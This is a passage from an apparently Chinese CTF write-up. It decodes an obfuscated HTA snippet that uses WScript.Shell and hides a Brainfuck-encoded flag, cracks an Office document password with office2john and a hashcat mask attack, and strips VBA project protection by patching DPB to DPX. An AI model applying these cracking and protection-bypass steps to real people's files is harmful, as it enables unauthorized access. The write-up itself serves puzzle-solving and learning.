class="hljs-number">1</span>sJTNFJTBBJTNDaGVhZCUzRSUwQSUyMCUyMCUyMCUyMCUzQ<span class="hljs-number">3</span>RpdGxlJTNFRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlM<span class="hljs-number">0</span>MlMkZ<span class="hljs-number">0</span>aXRsZSUzRSUwQSUzQ<span class="hljs-number">0</span>hUQSUzQUFQUExJQ<span class="hljs-number">0</span>FUSU<span class="hljs-number">9</span>OJTBBJTIwJTIwQVBQTElDQVRJT<span class="hljs-number">05</span>OQU<span class="hljs-number">1</span>FJTNEJTIyRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlMjIlMEElMjAlMjBJRCUzRCUyMkluY<span class="hljs-number">2</span>VwdGlvbiUyMiUwQSUyMCUyMFZFUlNJT<span class="hljs-number">04</span>lM<span class="hljs-number">0</span>QlMjIxLjAlMjIlMEElMjAlMjBTQ<span class="hljs-number">1</span>JPTEwlM<span class="hljs-number">0</span>QlMjJubyUyMiUyRiUzRSUwQSUyMCUwQSUzQ<span class="hljs-number">3</span>N<span class="hljs-number">0</span>eWxlJTIwdHlwZSUzRCUyMnRleHQlMkZjc<span class="hljs-number">3</span>MlMjIlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>MlMkZoZWFkJTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJmZWF<span class="hljs-number">0</span>dXJlJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJjb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>JTBBJTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTNDJTJGc<span class="hljs-number">3</span>R<span class="hljs-number">5</span>bGUlM<span class="hljs-number">0</span>UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM<span class="hljs-number">0</span>NoMSUyMGlkJTNEJTIydW<span class="hljs-number">5</span>hdmFpbGFibGUlMjIlMjBjbGFzcyUzRCUyMmxvYWRpbmclMjIlM<span class="hljs-number">0</span>VCdWlsZGluZyUyMGpzLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>lM<span class="hljs-number">0</span>MlMkZoMSUzRSUwQSUwOSUwOSUwOSUwOSUzQ<span class="hljs-number">3</span>NjcmlwdCUyMHR<span class="hljs-number">5</span>cGUlM<span class="hljs-number">0</span>QlMjJ<span class="hljs-number">0</span>ZXh<span class="hljs-number">0</span>JTJGamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUyMGxhbmd<span class="hljs-number">1</span>YWdlJTNEJTIyamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUzRSUwQSUwOSUwOSUwOSUwOSUwOWZ<span class="hljs-number">1</span>bmN<span class="hljs-number">0</span>aW<span class="hljs-number">9</span>uJTIwUnVuRmlsZSUyOCUyOSUyMCU<span class="hljs-number">3</span>QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMFdzaFNoZWxsJTIwJTNEJTIwbmV<span class="hljs-number">3</span>JTIwQWN<span class="hljs-number">0</span>aXZlWE<span class="hljs-number">9</span>iamVjdCUyOCUyMldTY<span class="hljs-number">3</span>JpcHQuU<span class="hljs-number">2</span>hlbGwlMjIlMjklM<span class="hljs-number">0</span>IlMEElMDklMDklMDklMDklMDlXc<span class="hljs-number">2</span>hTaGVsbC<span class="hljs-number">5</span>SdW<span class="hljs-number">4</span>lMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIwJTI<span class="hljs-number">1</span>d<span class="hljs-number">2</span>luZGlyJTI<span class="hljs-number">1</span>JTJGRGVza<span class="hljs-number">3</span>RvcCUyRmpzLnR<span class="hljs-number">4</span>dCUyMiUyQyUyMDElMkMlMjBmYWxzZSUyOSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyRiolMjB<span class="hljs-number">2</span>YXIlMjBvRXhlYyUyMCUzRCUyMFdzaFNoZWxsLkV<span class="hljs-number">4</span>ZWMlMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIyJTI<span class="hljs-number">5</span>JTNCJTIwKiUy<br><br>base<span class="hljs-number">64</span> decode:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span> encoding<span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span> standalone<span class="hljs-operator">=</span><span class="hljs-string">&quot;yes&quot;</span>?&gt;<br>&lt;assembly xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> manifestVersion<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;trustInfo xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>            &lt;requestedExecutionLevel level<span class="hljs-operator">=</span><span class="hljs-string">&quot;asInvoker&quot;</span> uiAccess<span class="hljs-operator">=</span><span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;application xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>        &lt;dpiAwareness xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;Do you know js&lt;/dpiAwareness&gt;<br>&lt;script language<span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript&quot;</span>&gt;document.write(unescape(&#x27;<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cbody<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%21</span>DOCTYPE<span class="hljs-variable">%20</span>html<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ctitle<span class="hljs-variable">%3</span>EDo<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Ftitle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>CHTA<span class="hljs-variable">%3</span>AAPPLICATION<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>APPLICATIONNAME<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Do<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>ID<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Inception<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>VERSION<span class="hljs-variable">%3</span>D<span class="hljs-variable">%221</span>.<span class="hljs-number">0</span><span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>SCROLL<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>no<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cstyle<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fcss<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fhead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>feature<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>content<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fstyle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ch<span class="hljs-number">1</span><span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>unavailable<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>loading<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>EBuilding<span class="hljs-variable">%20</span>js.....<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fh<span class="hljs-number">1</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>Cscript<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fjavascript<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>language<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>javascript<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>function<span class="hljs-variable">%20</span>RunFile<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>WshShell<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>ActiveXObject<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>WScript.Shell<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>WshShell.Run<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%20</span><span class="hljs-variable">%25</span>windir<span class="hljs-variable">%25</span><span class="hljs-variable">%2</span>FDesktop<span class="hljs-variable">%2</span>Fjs.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%201</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>F*<span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>oExec<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>WshShell.Exec<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span><br></code></pre></td></tr></table></figure>
<p>可以看到有一个script标签。我们把其他数据段也提出来，进行解码，然后只关注script标签部分。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-built_in">unescape</span>(<span class="hljs-string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>中间的代码提取出来。打开浏览器的开发模式，在控制台里面把中间代码敲上。</p>
<p>界面出现了一些元素。翻找页面元素。发现了一个p标签颜色是白色的，由于背景也是白的，所以在我们这算是不可见。打开看看。里面是brainfuck的代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- <br>-.-.- --.++ ++++.<br>+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- <br>&gt;---&lt; ]&gt;--- ---.+ ++++. -----<br>.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.<br>&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+<br> +++++ .---- -.++. ++.+.<br>--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- <br>.+.-. ---.+ ++.+. -.+++<br>+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---<br>-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ <br>.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.<br>+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ <br>.---- .+.++ ++.-- --.++<br>++.-. ----. +.-.+ ++++. <br>&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;<br></code></pre></td></tr></table></figure>
<p>解码得到：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D<br></code></pre></td></tr></table></figure>
<p>十六进制转换为字符串：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-number">0x446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h2>
<p>用hashcat对password.docm进行爆破。</p>
<p>首先提取文件的hash。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/Dest0g]<br>└─$ office2john password.docm <br>password.docm:$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1<br></code></pre></td></tr></table></figure>
<p>得到输出去掉前面的文件名写入到文件里。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10600</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">3</span> (Acrobat <span class="hljs-number">9</span>)                      | Documents<br><span class="hljs-attribute">10700</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">8</span> (Acrobat <span class="hljs-number">10</span> - <span class="hljs-number">11</span>)                | Documents<br> <span class="hljs-attribute">9400</span> | MS Office <span class="hljs-number">2007</span>                                   | Documents<br> <span class="hljs-attribute">9500</span> | MS Office <span class="hljs-number">2010</span>                                   | Documents<br> <span class="hljs-attribute">9600</span> | MS Office <span class="hljs-number">2013</span>                                   | Documents<br> <span class="hljs-attribute">9700</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4               | Documents<br> <span class="hljs-attribute">9710</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">1</span>  | Documents<br> <span class="hljs-attribute">9720</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">2</span>  | Documents<br> <span class="hljs-attribute">9800</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>/$<span class="hljs-number">4</span>, SHA1 + RC4              | Documents<br> <span class="hljs-attribute">9810</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">1</span>    | Documents<br> <span class="hljs-attribute">9820</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">2</span>    | Documents<br><br></code></pre></td></tr></table></figure>
<p>我们得到hash头是office2010，type为9500。</p>
<p>hint中提示密码为：</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">The length <span class="hljs-keyword">of</span> docm &#x27;s password <span class="hljs-keyword">is</span> 6<br>The Regular Expression <span class="hljs-keyword">of</span> the password <span class="hljs-keyword">is</span>:<br><span class="hljs-comment">[a-z]</span> <span class="hljs-comment">[a-z]</span> q <span class="hljs-comment">[a-z]</span> b <span class="hljs-comment">[a-z]</span><br></code></pre></td></tr></table></figure>
<p>采用掩码爆破。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/Dest0g]<br>└─$ hashcat docxhash -a 3 -m 9500 ?l?lq?lb?l<br>...<br>...<br>$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1:ulqsbt<br>                                                 <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: MS Office 2010<br>Hash.Target......: $office$*2010*100000*128*16*d135d71212d659473f2b5fb...6f4ab1<br>Time.Started.....: Mon May 23 14:56:52 2022 (4 mins, 53 secs)<br>Time.Estimated...: Mon May 23 15:01:45 2022 (0 secs)<br>Guess.Mask.......: ?l?lq?lb?l [6]<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:     1439 H/s (13.85ms) @ Accel:1024 Loops:512 Thr:1 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 421888/456976 (92.32%)<br>Rejected.........: 0/421888 (0.00%)<br>Restore.Point....: 12288/17576 (69.91%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:24-25 Iteration:0-1</span><br>Candidates.<span class="hljs-comment">#1....: udqabt -&gt; uiqebx</span><br><br><span class="hljs-comment"># ulqsbt</span><br></code></pre></td></tr></table></figure>
<p>得到密码为ulqsbt。但是我的word不知道为什么打不开这个文档。没辙了，我也懒得下其他office。</p>
<p>后面发现是WindowsDefender给我拦了…</p>
<p>打开文件，运行宏，弹出一个对话框。要求输入对应的口令。但是咱不知道口令。看看VBA的代码吧。结果VBA的代码是加密的，服了。52上面找到了如何破解。</p>
<p>首先另存为这个docm文件。将新保存的文件用zip打开。找到word/vbaProject.bin。取出来用二进制查看器打开。查找文件中的&quot;DPB&quot;字符串。将其修改为“DPX”</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">DPB</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br>TO：<br><span class="hljs-attribute">DPX</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br></code></pre></td></tr></table></figure>
<p>保存之后，重新改为docm文件。打开，这样我们就能打开对应的project了。</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Private</span> <span 